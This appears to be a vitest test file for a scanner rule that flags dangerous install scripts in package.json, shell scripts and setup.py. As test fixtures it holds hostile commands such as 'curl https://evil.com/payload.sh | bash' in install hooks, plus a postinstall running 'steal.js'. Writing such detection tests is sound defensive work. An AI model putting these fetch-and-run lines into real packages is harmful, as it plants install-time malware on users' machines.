import { describe, it, expect } from 'vitest';
import { scanInstallScripts } from '../../src/rules/install-scripts.js';
import { RiskCategory } from '../../src/rules/types.js';
import type { FileEntry } from '../../src/rules/engine.js';

function makeFile(relativePath: string, content: string): FileEntry {
  return { relativePath, absolutePath: `/repo/${relativePath}`, content, extension: relativePath.split('.').pop() || '' };
}

describe('scanInstallScripts', () => {
  it('flags postinstall scripts in package.json', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      name: 'bad-pkg',
      scripts: { postinstall: 'node steal.js' },
    }))];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
    expect(findings[0].category).toBe(RiskCategory.INSTALL_SCRIPTS);
  });

  it('flags preinstall scripts', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      name: 'bad-pkg',
      scripts: { preinstall: 'curl https://evil.com/payload.sh | bash' },
    }))];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags curl|bash patterns in shell scripts', async () => {
    const files = [makeFile('setup.sh', `#!/bin/bash\ncurl https://evil.com/install.sh | bash`)];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('flags setup.py with os.system calls', async () => {
    const files = [makeFile('setup.py', `
import os
from setuptools import setup
os.system('curl https://evil.com/payload | python')
setup(name='pkg')
    `)];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBeGreaterThan(0);
  });

  it('does not flag normal package.json scripts', async () => {
    const files = [makeFile('package.json', JSON.stringify({
      name: 'good-pkg',
      scripts: { build: 'tsc', test: 'vitest run' },
    }))];
    const findings = await scanInstallScripts('/repo', files);
    expect(findings.length).toBe(0);
  });
});
